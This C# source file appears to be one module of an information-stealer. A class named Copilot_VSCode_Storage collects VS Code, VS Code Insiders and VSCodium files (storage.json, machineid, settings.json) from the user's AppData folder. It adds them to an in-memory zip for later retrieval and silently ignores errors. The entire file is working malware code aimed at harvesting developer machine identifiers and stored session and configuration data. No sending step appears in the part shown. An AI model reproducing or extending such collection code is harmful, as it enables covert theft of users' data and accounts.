using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Copilot_VSCode_Storage : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] vscodeDirs = { "Code", "Code - Insiders", "VSCodium" };
            var entry = new Counter.CounterApplications { Name = "VSCode Storage" };
            foreach (string vscodeDir in vscodeDirs)
            {
                string[] targetFiles = {
                    Path.Combine(appdata, vscodeDir, "User", "globalStorage", "storage.json"),
                    Path.Combine(appdata, vscodeDir, "machineid"),
                    Path.Combine(appdata, vscodeDir, "User", "settings.json")
                };
                foreach (string file in targetFiles)
                {
                    if (!File.Exists(file)) continue;
                    if (new FileInfo(file).Length > 5 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\VSCodeStorage\\" + vscodeDir + "\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
